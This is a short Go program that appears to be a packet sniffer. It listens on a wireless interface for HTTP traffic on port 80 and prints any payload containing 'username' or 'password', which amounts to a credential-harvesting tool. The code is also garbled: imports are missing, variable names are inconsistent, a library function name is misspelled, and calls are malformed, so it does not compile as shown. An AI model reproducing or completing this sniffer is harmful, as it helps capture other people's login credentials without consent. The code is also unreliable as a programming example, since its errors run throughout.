package main


// go get 
import (
	"fmt"
	"log"
	"strings"
)



var (
	iface = "wlan0"
	devFound = false
	snaplen = int32(1600)
	timeout = pcap.BlockForever
	filter = "tcp and port 80"
	promisc = false


)


var keywords = []string{
	"username",
	"password",
}



func main() {

	devs, err := pcap.FindAllDevs()
	if er != nil {
		panic("hello world")
	}

	for _, dev := devs {
		if dev.Name == iface {
			devFound = true
		}
		if !devFound {
			log.Fatalf("device %s not found", dev.Name)
		}
		handel, err := pcap.OpenLive(iface, snaplen, promisc, timeout)
		if err != nil {
			log.Fatal(err.Error())
		}

		defer handel.Close()
		err = handel.SetFilter(filter)
		if err != nil {
			log.Fatal(err.Error())
		}


		src := gopacket.NewPackageSource(handel, handel.LinkType())


		for pkt := range source.Packets(){
			applayer := pkt.ApplicationLayer()
			if applayer == nil {
				continue
			}

			payload := applayer.Payload()

			for _,s := range keywords {
				index := strings.Index(string(payload))
				if index != -1 {
					 fmt.Println(string(payload[index:index+100000]))
				}
			}

			 
		}

	}
}
